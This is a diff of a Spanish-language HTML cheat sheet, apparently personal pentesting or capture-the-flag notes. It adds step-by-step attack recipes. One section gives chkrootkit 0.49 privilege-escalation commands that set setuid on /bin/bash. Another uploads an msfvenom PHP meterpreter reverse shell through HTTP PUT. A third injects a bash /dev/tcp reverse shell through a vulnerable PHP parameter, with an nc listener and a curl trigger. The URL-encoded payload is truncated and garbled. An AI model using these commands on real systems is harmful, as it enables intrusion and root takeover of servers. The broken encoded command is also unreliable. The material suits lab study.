@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Vulnerabilidades</title>
+  <link rel="icon" href="/images/terminal.png" type="image/png">
   <style>
     :root {
       --brick-fire: #B22222;
@@ -148,21 +149,58 @@
     <h2>Shell reversa con php en wp-admin</h2>
 
     <p>
-        Al iniciar sesion en wp-admin, si hay acceso a la seccion Appearance y hay codigo php, se puede pegar codigo de un php para conseguir una shell reversa.
+        Al iniciar sesion en wp-admin, si hay acceso a la seccion Appearance y hay codigo php, se puede pegar codigo de 
+        un php para conseguir una shell reversa.
     </p>
 
      <h2>Nombre personalizado de un dominio en una ip</h2>
 
     <p>
-      Al entrar a una ip (ej: http://10.2.168.99/), y aparece con un nombre de dominio (ej: http://vtcsec) y no permite acceder, se soluciona de la siguiente manera.
-      Ejecute "sudo nano /etc/hosts" para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece "10.2.168.99 vtcsec", guardalo y ya se puede acceder al sitio. 
+      Al entrar a una ip (ej: http://10.2.168.99/), y aparece con un nombre de dominio (ej: http://vtcsec) y 
+      no permite acceder, se soluciona de la siguiente manera.
+      Ejecute "sudo nano /etc/hosts" para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece 
+      "10.2.168.99 vtcsec", guardalo y ya se puede acceder al sitio. 
+    </p>
+
+    <h2>chkrootkit 0.49</h2>
+
+    <p>Para explotar este chkrootkit desactualizado debemos estar en "/tmp", luego ejecutar 
+      ( echo "/bin/bash" > /tmp/update ) , luego ( echo "chmod +s /bin/bash" >> /tmp/update ), y finalmente ( /bin/bash -p ). Con esta serie de comandos
+    crea un archivo "/tmp/update" que, al ejecutarse, establece el setuid en "/bin/bash" lo que permite 
+    ejecutar bash con privilegios elevados y luego ejecuta "/bin/bash -p" como usuario root.
+    </p>
+
+    <h2>Payload php inverso con metasploit y msfvenom a una pagina con metodo HTTP PUT</h2>
+
+    <p>Para verificar si podemos aprovechar y ejecutar este truco, usamos "curl -v -X OPTIONS (ip o url)", si acepta metodo PUT, 
+      es un buen comienzo. Al tener un servidor con metodo HTTP PUT, se pueden subir archivos con "curl -T archivo 
+      (ip/ruta/archivo) --http1.0", podemos aprovechar esta vulnerabilidad para subir una shell inversa. 
+      <br>Para crear la shell y subirlo a la maquina victima usamos "sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip atacante) 
+      LPORT=(funciona mejor con el 443) -f raw > archivo". 
+      Una vez creado el archivo, ejecutamos metasploit y usamos el "exploit/multi/handler" y seleccionamos el payload 
+      "payload/php/meterpreter_reverse_tcp", lo configuramos con nuestra ip atacante y el puerto que hayamos elejido, despues corremos 
+      el exploit y ejecutamos la shell que subimos al servidor.
+    </p>
+
+    <h2>
+      Shell reversa a traves de un sitio web con php inseguro
+    </h2>
+    <p>
+      Si nos encontramos en una situacion como esta " http://10.10.10.10/site/busque.php?buscar= [comando] ", donde un php permite ejecutar comandos del sistema, podemos aprovechar esto para generar una shell reversa, ( /bin/bash -c 'bash -i >& /dev/tcp/ip atacante/puerto 0>&1' ), este comando debemos colocarlo donde el php nos permite enviar codigo, probablemente tengamos que codificarlo en URL por lo que deberia quedar asi ( E10%2F443%200%3E%261%27 ). <br>Una vez codificado debemos usar dos terminales de la maquina atacante, en una colocamos un "nc -lvnp [puerto que hayamos elejido]", y ejecutar en la otra el comando "curl" de esta manera ( curl "http://10.10.10.10/site/busque.php?buscar=E10%2F443%200%3E%261%27" ), finalmente volvemos a la terminal del netcat y ya acabaremos dentro de la maquina.
+
     </p>
 
     <h2>
       Directorios de interes
     </h2>
     <p>
-      /var/www/html [se aloja un servicio web]
+      /etc/crontab [se pueden ver que tareas se ejecutan en el sistema periodicamente]
+      <br>/var/www/html [se suele alojar un servicio web]
+      <br>/var/spool/cron/crontabs/ [archivos cron por usuario]
+      <br>/etc/cron.d/ [archivos cron adicionales definidos por el administrador]
+      <br>/etc/cron.daily/, /etc/cron.hourly/, /etc/cron.weekly/, /etc/cron.monthly/ [directorios con scripts para ejecutar tareas en intervalos específicos]
+      <br>/etc/cron.allow y /etc/cron.deny [archivos para controlar el acceso a cron]
+      <br>/etc/anacrontab [tareas periódicas para sistemas que no están siempre encendidos]
     </p>
   </article>
 
